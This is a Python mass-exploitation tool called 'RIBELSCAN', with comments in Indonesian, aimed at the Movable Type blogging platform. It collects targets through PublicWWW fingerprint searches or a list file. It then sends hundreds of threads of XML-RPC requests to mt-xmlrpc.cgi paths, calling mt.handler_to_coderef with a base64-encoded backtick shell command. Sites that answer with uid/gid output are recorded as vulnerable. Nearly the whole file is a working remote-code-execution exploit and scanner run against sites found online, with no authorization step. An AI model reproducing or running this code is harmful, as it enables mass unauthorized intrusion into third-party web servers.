#!/usr/bin/env python3
import requests
import sys
import re
import time
import base64
import threading
import gc
import json
import os
import weakref
from urllib.parse import urljoin, urlparse, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import logging

# FIX: Monkey patch untuk HTTPResponse
import http.client
original_close = http.client.HTTPResponse.close

def patched_close(self):
    try:
        if hasattr(self, 'fp') and self.fp:
            original_close(self)
    except AttributeError:
        pass

http.client.HTTPResponse.close = patched_close

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import colorama
colorama.init()

# OPTIMASI MEMORI: Threshold GC lebih agresif
gc.set_threshold(100, 5, 5)
gc.enable()

# OPTIMASI MEMORI: Batasi jumlah target yang disimpan di memori
MAX_TARGETS_IN_MEMORY = 50000

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'text/xml',
    'Connection': 'keep-alive',  # OPTIMASI: keep-alive untuk koneksi
    'Accept-Encoding': 'gzip, deflate',  # OPTIMASI: kompresi
}

counter_lock = threading.Lock()
scanned_count = 0
found_count = 0
valid_http200 = 0

# OPTIMASI: Buffer untuk hasil, flush ke file berkala
result_buffer = []
result_buffer_lock = threading.Lock()
BUFFER_FLUSH_SIZE = 100

logging.basicConfig(
    filename='scan_errors.log',
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def show_banner():
    banner = r"""
    ███╗   ███╗████████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
    ████╗ ████║╚══██╔══╝     ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ██╔████╔██║   ██║        ███████╗██║     ███████║██╔██╗ ██║
    ██║╚██╔╝██║   ██║        ╚════██║██║     ██╔══██║██║╚██╗██║
    ██║ ╚═╝ ██║   ██║        ███████║╚██████╗██║  ██║██║ ╚████║
    ╚═╝     ╚═╝   ╚═╝        ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝

               MOVABLE TYPE SCANNER - RIBELSCAN v4.4
    """
    print(banner)


class PublicWWWClient:
    """Client untuk PublicWWW API - Berdasarkan Dokumentasi Resmi"""
    
    BASE_URL = "https://api.publicwww.com/v1/"
    
    def __init__(self, api_key=None):
        self.api_key = api_key
        self.session = requests.Session()
        if self.api_key:
            self.session.headers.update({
                'Authorization': f'Bearer {self.api_key}',
                'User-Agent': 'MTScanner/4.4 (https://publicwww.com/docs)'
            })
        self.total_pages = 0
        self.total_results = 0
        self.state_file = "api_state.json"
        self.timeout = 30
        
    def _handle_rate_limit(self, response):
        if response.status_code == 429:
            retry_after = int(response.headers.get('Retry-After', 10))
            print(f"\033[1;33m[!] Rate limit reached. Waiting {retry_after} seconds...\033[0m")
            time.sleep(retry_after)
            return True
        return False

    def save_state(self, query_index, query, urls_collected):
        state = {
            'last_query_index': query_index,
            'last_query': query,
            'urls_collected': urls_collected,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        try:
            with open(self.state_file, 'w') as f:
                json.dump(state, f, indent=2)
        except:
            pass

    def load_state(self):
        try:
            if os.path.exists(self.state_file):
                with open(self.state_file, 'r') as f:
                    return json.load(f)
        except:
            pass
        return None

    def clear_state(self):
        try:
            if os.path.exists(self.state_file):
                os.remove(self.state_file)
        except:
            pass

    def search(self, query, max_pages=10, start_page=1, per_page=100):
        urls = []
        
        if not self.api_key:
            print("\033[1;31m[!] API Key tidak ditemukan!\033[0m")
            return urls
        
        params = {
            'query': query,
            'format': 'json',
            'per_page': min(per_page, 100),
            'page': start_page
        }
        
        current_page = start_page
        pages_fetched = 0
        
        while pages_fetched < max_pages:
            params['page'] = current_page
            
            try:
                print(f"\033[1;90m[*] Mengambil halaman {current_page}...\033[0m")
                resp = self.session.get(self.BASE_URL + 'search', params=params, timeout=self.timeout)
                
                if resp.status_code == 429:
                    if self._handle_rate_limit(resp):
                        continue
                    else:
                        break
                
                if resp.status_code == 200:
                    data = resp.json()
                    
                    if current_page == start_page:
                        self.total_results = data.get('total', 0)
                        self.total_pages = (self.total_results + per_page - 1) // per_page
                        print(f"\033[1;36m[*] Total hasil: {self.total_results:,} URL\033[0m")
                    
                    results = data.get('results', [])
                    if not results:
                        break
                    
                    page_urls = self._extract_urls_from_results(results)
                    urls.extend(page_urls)
                    print(f"\033[1;32m[+] Halaman {current_page}: {len(page_urls)} URL ditemukan\033[0m")
                    
                    # OPTIMASI: hapus data setelah diproses
                    del data
                    del results
                    
                    if len(page_urls) < per_page or current_page >= self.total_pages:
                        break
                    
                    current_page += 1
                    pages_fetched += 1
                    
                elif resp.status_code == 401:
                    print("\033[1;31m[!] API Key tidak valid!\033[0m")
                    break
                elif resp.status_code == 403:
                    print("\033[1;31m[!] Tidak ada plan aktif!\033[0m")
                    break
                elif resp.status_code == 400:
                    error_detail = resp.json().get('error', 'Parameter tidak valid')
                    print(f"\033[1;31m[!] Bad Request: {error_detail}\033[0m")
                    break
                else:
                    print(f"\033[1;31m[!] Error {resp.status_code}: {resp.text[:200]}\033[0m")
                    break
                    
            except requests.exceptions.Timeout:
                print("\033[1;33m[!] Timeout, lanjut...\033[0m")
                current_page += 1
                pages_fetched += 1
                continue
            except Exception as e:
                print(f"\033[1;31m[!] Error: {e}\033[0m")
                break
            finally:
                # OPTIMASI: bersihkan response
                try:
                    resp.close()
                except:
                    pass
        
        print(f"\033[1;36m[*] Total URL terkumpul: {len(urls):,}\033[0m")
        return urls
    
    def _extract_urls_from_results(self, results):
        urls = []
        seen = set()
        for result in results:
            url = None
            if 'url' in result and result['url']:
                url = self._clean_url(result['url'])
            elif 'domain' in result:
                domain = result['domain']
                if domain and domain.startswith(('http://', 'https://')):
                    url = self._clean_url(domain)
            
            if url:
                url = url.rstrip('/')
                if url not in seen:
                    seen.add(url)
                    urls.append(url)
        
        return urls
    
    def _clean_url(self, url):
        if not url or not isinstance(url, str):
            return None
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            return None
        for param in ['utm_', 'fbclid', 'ref=', 'source=']:
            if param in url:
                url = re.sub(r'[&?]' + param + r'[^&]*', '', url)
                url = url.rstrip('?&')
        return url
    
    def search_mt_vulnerable(self, max_pages=1000000, resume=True):
        """Search tanpa filter"""
        
        queries = [
            '"/mt-static/"',
            '"/mt.js"',
            '"/mt-static/themes/"',
            '"generator" "content=\"Movable Type"',
            '"name=\"generator\"" "content=\"Movable Type"',
            '"name=\'generator\'" "content=\'Movable Type"',
            '"content=\"Movable Type" "/mt-static/"',
            'depth:all "name=\"generator\"" "content=\"Movable Type"',
            '"/mt-tb.cgi"',
            '"/mt-search.cgi"',
            '"/mt-comments.cgi"',
            '"/mt-feed.cgi"',
            '"/mt-atom.cgi"',
            '"/mt-cp.cgi"',
        ]
        
        start_index = 0
        if resume:
            state = self.load_state()
            if state:
                start_index = state.get('last_query_index', 0) + 1
                print(f"\033[1;33m[!] Resume dari query ke-{start_index + 1}\033[0m")
        
        all_urls = []
        all_domains = set()
        
        print(f"\033[1;36m[*] Menggunakan {len(queries)} query\033[0m")
        
        for i, query in enumerate(queries, 1):
            if i <= start_index:
                continue
                
            print(f"\n\033[1;34m[{i}/{len(queries)}] Executing: {query}\033[0m")
            urls = self.search(query, max_pages)
            
            for url in urls:
                if url and url.startswith(('http://', 'https://')):
                    try:
                        parsed = urlparse(url)
                        domain = parsed.netloc
                        if domain and domain not in all_domains:
                            all_domains.add(domain)
                            all_urls.append(url)
                    except:
                        pass
            
            # OPTIMASI: hapus urls setelah diproses
            del urls
            gc.collect()
            
            print(f"\033[1;32m[+] Total URL unik terkumpul: {len(all_urls):,}\033[0m")
            
            self.save_state(i, query, len(all_urls))
            
            if i < len(queries):
                wait_time = 15
                print(f"\033[1;90m[*] Menunggu {wait_time} detik...\033[0m")
                time.sleep(wait_time)
        
        print(f"\n\033[1;36m{'='*60}\033[0m")
        print(f"\033[1;32m[+] Total URL terkumpul: {len(all_urls):,}\033[0m")
        print(f"\033[1;36m{'='*60}\033[0m")
        
        self.clear_state()
        
        # OPTIMASI: clear domains set
        all_domains.clear()
        del all_domains
        
        return all_urls


class ProgressBar:
    def __init__(self, total, width=50):
        self.total = total
        self.width = width
        self.start_time = time.time()
        self.last_update = 0
        self.update_interval = 0.5  # OPTIMASI: kurangi frekuensi update
        self.lock = threading.Lock()
        self.current_line = ""
        
    def get_progress_line(self, current, found, http200):
        percent = (current / self.total * 100) if self.total > 0 else 0
        filled = int(self.width * current / self.total) if self.total > 0 else 0
        bar = '█' * filled + '░' * (self.width - filled)
        elapsed = time.time() - self.start_time
        speed = current / elapsed if elapsed > 0 else 0
        
        if speed > 0:
            remaining_sec = (self.total - current) / speed
            if remaining_sec > 3600:
                remaining_str = f"{remaining_sec/3600:.1f}h"
            elif remaining_sec > 60:
                remaining_str = f"{remaining_sec/60:.1f}m"
            else:
                remaining_str = f"{remaining_sec:.0f}s"
        else:
            remaining_str = "?"
        
        return (f'\r\033[K\033[92m[{bar}]\033[0m \033[93m{percent:5.1f}%\033[0m '
                f'\033[96m{current:,}/{self.total:,}\033[0m '
                f'\033[94mHTTP200: {http200}\033[0m '
                f'\033[92mGOTCHA: {found}\033[0m '
                f'\033[90m[{speed:.1f}/s] {remaining_str}\033[0m')
        
    def update(self, current, found=0, http200=0, force=False):
        now = time.time()
        if not force and (now - self.last_update) < self.update_interval:
            return
        with self.lock:
            self.last_update = now
            progress_line = self.get_progress_line(current, found, http200)
            self.current_line = progress_line
            sys.stdout.write(progress_line)
            sys.stdout.flush()
    
    def print_gotcha(self, message):
        with self.lock:
            current_progress = self.current_line
            sys.stdout.write('\r\033[K')
            sys.stdout.write(message + '\n')
            sys.stdout.write(current_progress)
            sys.stdout.flush()
    
    def finish(self, found, http200):
        with self.lock:
            elapsed = time.time() - self.start_time
            sys.stdout.write(f'\r\033[K\033[92m[{"█" * self.width}]\033[0m \033[93m100.0%\033[0m '
                            f'\033[96m{self.total:,}/{self.total:,}\033[0m '
                            f'\033[94mHTTP200: {http200}\033[0m '
                            f'\033[92mGOTCHA: {found}\033[0m '
                            f'\033[90m[Finished in {elapsed:.1f}s]\033[0m\n')
            sys.stdout.flush()


class MTScanner:
    def __init__(self):
        from requests.adapters import HTTPAdapter
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        
        # OPTIMASI: pool size lebih kecil, connection reuse
        adapter = HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,
            pool_block=False
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        self.timeout = 5
        
        # OPTIMASI: Pre-compile regex untuk kecepatan
        self._compile_patterns()
        
        self.common_paths = [
            'mt/mt-xmlrpc.cgi',
            'cgi-bin/mt/mt-xmlrpc.cgi',
            'cgi-bin/mt-xmlrpc.cgi',
            'mtos-4.1/mt-xmlrpc.cgi',
            'mt-3.2/mt-xmlrpc.cgi',
            'blog/mt-xmlrpc.cgi',
            'blogs/mt-xmlrpc.cgi',
            'cgi-bin/blog/mt-xmlrpc.cgi',
            'admin/mt-xmlrpc.cgi',
            'cgi-bin/admin/mt-xmlrpc.cgi',
            'cms/mt-xmlrpc.cgi',
            'cgi-bin/cms/mt-xmlrpc.cgi',
            'cgi-bin/cms-new/mt-xmlrpc.cgi',
            'cgi-bin/cms2/mt-xmlrpc.cgi',
            'cgi-bin/mt7/mt-xmlrpc.cgi',
            'cgi-bin/mt7-panel/mt-xmlrpc.cgi',
            'cgi-bin/mt7-panel2/mt-xmlrpc.cgi',
            'cgi-bin/mtos52/mt-xmlrpc.cgi',
            'cgi-bin/MT-6.5/mt-xmlrpc.cgi',
            'movabletype/mt-xmlrpc.cgi',
            'cgi-bin/movabletype/mt-xmlrpc.cgi',
            'mtos/mt-xmlrpc.cgi',
            'cgi-bin/mtos/mt-xmlrpc.cgi',
            'mtb/mt-xmlrpc.cgi',
            'mtt/mt-xmlrpc.cgi',
            'cgi-bin/mtt/mt-xmlrpc.cgi',
            'weblog/mt-xmlrpc.cgi',
            'cgi-bin/weblog/mt-xmlrpc.cgi',
            'powercms/mt-xmlrpc.cgi',
            'cgi-bin/powercms/mt-xmlrpc.cgi',
            'cmt/mt-xmlrpc.cgi',
            'mt-cgi/mt-xmlrpc.cgi',
            'cgi-bin/mt-cgi/mt-xmlrpc.cgi',
        ]
    
    def _compile_patterns(self):
        """OPTIMASI: Pre-compile semua regex pattern"""
        self.re_static_path = re.compile(r'(.*?)/(?:assets_c|mt-static|mt_templates|mt_plugins|mt_themes)/', re.IGNORECASE)
        
        self.re_mt_js = [
            re.compile(r'MT\.BlogURL\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'MT\.StaticPath\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'MT\.CgiURL\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'baseUrl\s*[:=]\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'var\s+path\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'__mt_path\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE),
            re.compile(r'["\']([^"\']*mt-static[^"\']*)["\']', re.IGNORECASE),
            re.compile(r'["\']([^"\']*cgi-bin[^"\']*mt[^"\']*)["\']', re.IGNORECASE),
        ]
        
        self.re_mt_js_url = re.compile(
            r'(.*?)/(?:mt-static|cgi-bin|mt\.js|mt\.cgi|mt-tb\.cgi|mt-search\.cgi|'
            r'mt-comments\.cgi|mt-feed\.cgi|mt-atom\.cgi|mt-cp\.cgi|mt-view\.cgi|'
            r'mt-add-notify\.cgi|mt-check\.cgi|mt-upgrade\.cgi|mt-wizard\.cgi|'
            r'mt-export\.cgi|mt-config\.cgi|xmlrpc\.cgi|assets_c)/',
            re.IGNORECASE
        )
        
        self.re_mt_path = re.compile(
            r'(.*?)/(?:mt-static|mt-tb\.cgi|mt\.cgi|mt-search\.cgi|mt-comments\.cgi|'
            r'mt-feed\.cgi|mt-atom\.cgi|mt-cp\.cgi|mt-view\.cgi|mt-add-notify\.cgi|'
            r'mt-check\.cgi|mt-upgrade\.cgi|mt-wizard\.cgi|mt-export\.cgi|'
            r'mt-config\.cgi|xmlrpc\.cgi|assets_c|mt_templates|mt_plugins|mt_themes)/'
        )
        
        self.re_uid = re.compile(r'(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))')
        
        # HTML pattern - gabung jadi satu regex besar
        self.re_html = re.compile(
            r'(?:href|src|action)=["\']([^"\']*(?:mt-static|mt-tb\.cgi|mt-search\.cgi|'
            r'mt-comments\.cgi|mt-feed\.cgi|mt-atom\.cgi|mt-cp\.cgi|mt\.cgi|assets_c|'
            r'mt_templates)[^"\']*)["\']',
            re.IGNORECASE
        )
        
        self.re_html_url = re.compile(
            r'https?://[^\s"\']+(?:mt-tb\.cgi|mt\.cgi|mt-search\.cgi|mt-comments\.cgi|mt-static|assets_c)[^\s"\']*',
            re.IGNORECASE
        )
    
    def extract_path_from_static_url(self, url):
        try:
            parsed = urlparse(url)
            match = self.re_static_path.search(parsed.path)
            if match:
                base_path = match.group(1)
                if not base_path:
                    base_path = '/'
                new_path = base_path
                if not new_path.endswith('/'):
                    new_path += '/'
                return urlunparse((parsed.scheme, parsed.netloc, new_path, '', '', ''))
            return None
        except:
            return None
    
    def scan_mt_js(self, base_url):
        discovered_paths = []
        mt_js_paths = ['mt.js', 'blog/mt.js']
        extracted = self.extract_path_from_static_url(base_url)
        if extracted:
            mt_js_paths.insert(0, extracted.replace(base_url, '') + 'mt.js')
        
        for mt_js_path in mt_js_paths:
            if mt_js_path.startswith('/'):
                full_url = urljoin(base_url, mt_js_path[1:])
            elif mt_js_path.startswith('http'):
                full_url = mt_js_path
            else:
                full_url = urljoin(base_url, mt_js_path)
            
            try:
                resp = self.session.get(full_url, timeout=self.timeout)
                if resp.status_code == 200:
                    content = resp.text
                    
                    for pattern in self.re_mt_js:
                        matches = pattern.findall(content)
                        for match in matches:
                            if match and 'http' in match:
                                extracted_path = self.extract_path_from_mt_js_url(match)
                            else:
                                path_url = urljoin(full_url, match)
                                extracted_path = self.extract_path_from_mt_js_url(path_url)
                            if extracted_path:
                                discovered_paths.append(extracted_path)
                    
                    # OPTIMASI: hapus content setelah diproses
                    del content
                    
                    if discovered_paths:
                        result = list(set(discovered_paths))
                        del discovered_paths
                        return result
            except:
                pass
            finally:
                try:
                    resp.close()
                except:
                    pass
        
        return list(set(discovered_paths)) if discovered_paths else []
    
    def extract_path_from_mt_js_url(self, url):
        try:
            parsed = urlparse(url)
            match = self.re_mt_js_url.search(parsed.path)
            if match:
                base_path = match.group(1)
                if not base_path:
                    base_path = '/'
                new_url = urlunparse((parsed.scheme, parsed.netloc, base_path, '', '', ''))
                if not new_url.endswith('/'):
                    new_url += '/'
                return new_url
            
            if '/' in parsed.path:
                parts = parsed.path.rsplit('/', 2)
                if len(parts) > 1:
                    base_path = '/'.join(parts[:-1])
                    if base_path:
                        new_url = urlunparse((parsed.scheme, parsed.netloc, base_path, '', '', ''))
                        if not new_url.endswith('/'):
                            new_url += '/'
                        return new_url
            return None
        except:
            return None
    
    def build_payload(self):
        # OPTIMASI: cache payload
        if not hasattr(self, '_payload_cache'):
            cmd = 'id'
            encoded = base64.b64encode(f"`{cmd}`".encode()).decode()
            self._payload_cache = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>mt.handler_to_coderef</methodName>
    <params><param><value><base64>{encoded}</base64></value></param></params>
</methodCall>'''
        return self._payload_cache

    def extract_uid(self, text):
        match = self.re_uid.search(text)
        return match.group(0) if match else None

    def extract_mt_path_from_url(self, url):
        try:
            match = self.re_mt_path.search(url)
            if match:
                extracted_path = match.group(1)
                parsed = urlparse(extracted_path)
                path = parsed.path
                if path.endswith('/'):
                    path = path[:-1]
                if '://' in path:
                    parsed2 = urlparse(path)
                    path = parsed2.path
                if not path:
                    return '/'
                return path + '/'
        except:
            pass
        return None

    def find_mt_paths_in_html(self, html, base_url):
        found_paths = set()
        found_urls = set()
        
        # OPTIMASI: pakai pre-compiled regex
        for match in self.re_html.finditer(html):
            matched_text = match.group(1).strip()
            if matched_text.startswith(('http://', 'https://')):
                full_url = matched_text
            else:
                full_url = urljoin(base_url, matched_text)
            extracted = self.extract_mt_path_from_url(full_url)
            if extracted:
                found_paths.add(extracted)
                found_urls.add(full_url)
        
        for match in self.re_html_url.finditer(html):
            full_url = match.group(0).strip()
            extracted = self.extract_mt_path_from_url(full_url)
            if extracted:
                found_paths.add(extracted)
                found_urls.add(full_url)
        
        return list(found_paths), list(found_urls)

    def scan_target(self, target, progress_bar):
        global scanned_count, found_count, valid_http200

        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        target = target.rstrip('/')

        resp = None
        try:
            def test_path(full_url):
                test_resp = None
                try:
                    test_resp = self.session.post(full_url, data=self.build_payload(), timeout=self.timeout)
                    if test_resp.status_code == 200:
                        return self.extract_uid(test_resp.text)
                except:
                    pass
                finally:
                    # OPTIMASI: close response setelah dipakai
                    if test_resp is not None:
                        try:
                            test_resp.close()
                        except:
                            pass
                return None

            # STEP 1: Satu request GET
            try:
                resp = self.session.get(target, timeout=self.timeout, allow_redirects=True)
                if resp.status_code != 200:
                    with counter_lock:
                        scanned_count += 1
                        progress_bar.update(scanned_count, found_count, valid_http200)
                    return []
            except:
                with counter_lock:
                    scanned_count += 1
                    progress_bar.update(scanned_count, found_count, valid_http200)
                return []

            with counter_lock:
                valid_http200 += 1

            # STEP 2: Cari path dari HTML
            mt_paths_found = []
            mt_urls_found = []
            try:
                html_text = resp.text
                html_paths, html_urls = self.find_mt_paths_in_html(html_text, target)
                mt_paths_found.extend(html_paths)
                mt_urls_found.extend(html_urls)
                # OPTIMASI: hapus html setelah diproses
                del html_text
            except:
                pass

            # STEP 3: SCAN MT.JS
            mt_paths_from_js = self.scan_mt_js(target)
            if mt_paths_from_js:
                mt_paths_found.extend(mt_paths_from_js)
                del mt_paths_from_js

            # STEP 4: Extract dari URL
            extracted_from_url = self.extract_mt_path_from_url(target)
            if extracted_from_url:
                mt_paths_found.append(extracted_from_url)
            
            static_path = self.extract_path_from_static_url(target)
            if static_path and static_path != target:
                mt_paths_found.append(static_path)

            mt_paths_found = list(set([p for p in mt_paths_found if p]))
            mt_urls_found = list(set(mt_urls_found))

            # STEP 5: Build daftar path
            paths_to_test = []
            
            for mt_path in mt_paths_found:
                if mt_path:
                    clean_path = mt_path.strip('/')
                    if clean_path:
                        paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
                        paths_to_test.append(f"{clean_path}/xmlrpc.cgi")
                    else:
                        paths_to_test.append("mt-xmlrpc.cgi")
                        paths_to_test.append("xmlrpc.cgi")

            for mt_url in mt_urls_found:
                extracted = self.extract_mt_path_from_url(mt_url)
                if extracted:
                    clean_path = extracted.strip('/')
                    if clean_path:
                        paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
                    else:
                        paths_to_test.append("mt-xmlrpc.cgi")

            paths_to_test.extend(self.common_paths)
            
            if static_path:
                clean_path = static_path.strip('/')
                if clean_path:
                    paths_to_test.append(f"{clean_path}/mt-xmlrpc.cgi")
            
            paths_to_test = list(set(paths_to_test))

            # STEP 6: Test semua path
            for path in paths_to_test:
                full_url = f"{target}/{path}"
                vuln = test_path(full_url)
                if vuln:
                    with counter_lock:
                        scanned_count += 1
                        found_count += 1
                    
                    gotcha_msg = f'\033[1;31m[GOTCHA!]\033[0m {full_url} >> \033[1;32m{vuln}\033[0m'
                    
                    progress_bar.print_gotcha(gotcha_msg)
                    progress_bar.update(scanned_count, found_count, valid_http200, force=True)

                    return [(full_url, vuln, mt_paths_found, mt_urls_found)]

            with counter_lock:
                scanned_count += 1
                progress_bar.update(scanned_count, found_count, valid_http200)

            return []
            
        except Exception as e:
            logging.warning(f"Error scanning {target}: {str(e)}")
            with counter_lock:
                scanned_count += 1
                progress_bar.update(scanned_count, found_count, valid_http200)
            return []
        finally:
            # OPTIMASI: close response + clear locals
            if resp is not None:
                try:
                    resp.close()
                except:
                    pass
            # Paksa GC tiap target selesai
            gc.collect(0)

    def run(self):
        global scanned_count, found_count, valid_http200
        
        show_banner()
        
        scanned_count = 0
        found_count = 0
        valid_http200 = 0
        
        print("\033[1;36m[[CONFIGURATION]]\033[0m")
        
        print("\n\033[1;33m[?] Pilih mode input:\033[0m")
        print("  1. File list")
        print("  2. PublicWWW API (Auto-run all queries)")
        print("  3. Hybrid (API + File)")
        mode = input("\n\033[1;33m[?] Pilihan \033[0m[1]: ").strip() or "1"
        
        targets = []
        api_key = None
        
        if mode in ["1", "3"]:
            input_file = input("\033[1;33m[?] File list target \033[0m[list.txt]: ").strip()
            if not input_file:
                input_file = "list.txt"
            
            try:
                with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                    file_targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                targets.extend(file_targets)
                print(f"\033[1;32m[+] Loaded {len(file_targets):,} targets dari file\033[0m")
                del file_targets
            except Exception as e:
                print(f"\033[1;31m[!] Error loading file: {e}\033[0m")
        
        if mode in ["2", "3"]:
            api_key = input("\033[1;33m[?] PublicWWW API Key \033[0m: ").strip()
            if not api_key:
                print("\033[1;33m[!] API Key tidak diisi, skip API mode\033[0m")
            else:
                max_pages = int(input("\033[1;33m[?] Maksimum halaman per query \033[0m[5]: ").strip() or "5")
                resume = input("\033[1;33m[?] Resume dari state sebelumnya? \033[0m[y/N]: ").strip().lower() == 'y'
                
                client = PublicWWWClient(api_key)
                
                print(f"\n\033[1;36m{'='*60}\033[0m")
                print(f"\033[1;36m[*] MENJALANKAN SEMUA QUERY MT\033[0m")
                print(f"\033[1;36m{'='*60}\033[0m")
                
                query_targets = client.search_mt_vulnerable(max_pages, resume=resume)
                
                targets.extend(query_targets)
                print(f"\n\033[1;32m[+] Total dari API: {len(query_targets):,} URL\033[0m")
                
                # OPTIMASI: clear client setelah dipakai
                del query_targets
                del client
                gc.collect()
        
        if not targets:
            print("\033[1;31m[!] No targets found\033[0m")
            return
        
        # OPTIMASI: dedupe dengan set
        targets = list(set(t for t in targets if t and t.startswith(('http://', 'https://'))))
        targets.sort()
        
        threads_input = input("\n\033[1;33m[?] Jumlah thread \033[0m[500]: ").strip()
        threads = int(threads_input) if threads_input else 500
        
        timeout_input = input("\033[1;33m[?] Timeout (detik) \033[0m[5]: ").strip()
        self.timeout = int(timeout_input) if timeout_input else 5
        
        timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
        output_file = f"mt_results_{timestamp}.txt"
        
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"# MT Scanner Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Targets: {len(targets):,}\n")
            f.write(f"# Format: URL >> uid/gid\n\n")
        
        print(f"\n\033[1;36m[[SCAN PARAMETERS]]\033[0m")
        print(f"\033[1;32m[+] Total Targets  : {len(targets):,}\033[0m")
        print(f"\033[1;32m[+] Threads        : {threads}\033[0m")
        print(f"\033[1;32m[+] Timeout        : {self.timeout}s\033[0m")
        print(f"\033[1;32m[+] Output File    : {output_file}\033[0m")
        print(f"\n\033[1;36m[*] Scanning started... (Ctrl+C to stop)\033[0m\n")
        
        start_time = time.time()
        progress_bar = ProgressBar(total=len(targets), width=45)
        progress_bar.update(0, 0, 0)
        
        # OPTIMASI: gunakan file handle yang di-buffer
        result_file_handle = open(output_file, "a", encoding="utf-8")
        result_file_lock = threading.Lock()
        
        def process(target):
            return self.scan_target(target, progress_bar)
        
        # OPTIMASI: chunk target untuk hindari memory spike
        def target_generator():
            for t in targets:
                yield t
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                # OPTIMASI: submit batch, jangan semua sekaligus
                future_to_target = {}
                target_iter = iter(targets)
                
                # Initial batch
                batch_size = threads * 2
                for _ in range(min(batch_size, len(targets))):
                    try:
                        t = next(target_iter)
                        future_to_target[executor.submit(process, t)] = t
                    except StopIteration:
                        break
                
                def periodic_update():
                    while True:
                        time.sleep(1.0)
                        progress_bar.update(scanned_count, found_count, valid_http200)
                
                update_thread = threading.Thread(target=periodic_update, daemon=True)
                update_thread.start()
                
                completed = 0
                total = len(targets)
                
                while future_to_target:
                    # OPTIMASI: tunggu future selesai satu per satu
                    done_futures = []
                    for future in list(future_to_target.keys()):
                        if future.done():
                            done_futures.append(future)
                    
                    if not done_futures:
                        time.sleep(0.01)
                        continue
                    
                    for future in done_futures:
                        target = future_to_target.pop(future)
                        try:
                            res = future.result()
                            if res:
                                with result_file_lock:
                                    for url, vuln, discovered_paths, discovered_urls in res:
                                        result_file_handle.write(f"{url} >> {vuln}\n")
                                    result_file_handle.flush()
                        except Exception as e:
                            logging.warning(f"Error processing {target}: {str(e)}")
                        
                        completed += 1
                        
                        # Submit target baru
                        try:
                            t = next(target_iter)
                            future_to_target[executor.submit(process, t)] = t
                        except StopIteration:
                            pass
                        
                        # OPTIMASI: GC berkala tiap 500 target
                        if completed % 500 == 0:
                            gc.collect()
                            # Update progress
                            progress_bar.update(scanned_count, found_count, valid_http200, force=True)
                        
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Scan dihentikan oleh user!\033[0m")
        finally:
            result_file_handle.close()
        
        progress_bar.update(scanned_count, found_count, valid_http200, force=True)
        progress_bar.finish(found_count, valid_http200)
        elapsed = time.time() - start_time
        
        print(f"\n\033[1;36m[[SCAN SUMMARY]]\033[0m")
        print(f"\033[1;32m[+] Total Targets    : {len(targets):,}\033[0m")
        print(f"\033[1;32m[+] Total Scanned    : {scanned_count:,}\033[0m")
        print(f"\033[1;34m[+] HTTP 200 OK      : {valid_http200:,}\033[0m")
        print(f"\033[1;35m[+] HTTP Not 200     : {scanned_count - valid_http200:,}\033[0m")
        print(f"\033[1;31m[+] VULNERABLE       : {found_count}\033[0m")
        print(f"\033[1;32m[+] Time Elapsed     : {elapsed:.1f}s ({elapsed/60:.1f}m)\033[0m")
        print(f"\033[1;32m[+] Speed            : {scanned_count/elapsed:.1f} targets/sec\033[0m")
        print(f"\033[1;32m[+] Result saved     : {output_file}\033[0m")
        
        # OPTIMASI: clear semua
        del targets
        gc.collect()


if __name__ == "__main__":
    try:
        MTScanner().run()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Program stopped by user.\033[0m")
    except Exception as e:
        print(f"\n\033[1;31m[!] Error: {e}\033[0m")
        logging.error(f"Fatal error: {e}")
    finally:
        gc.collect()
        gc.enable()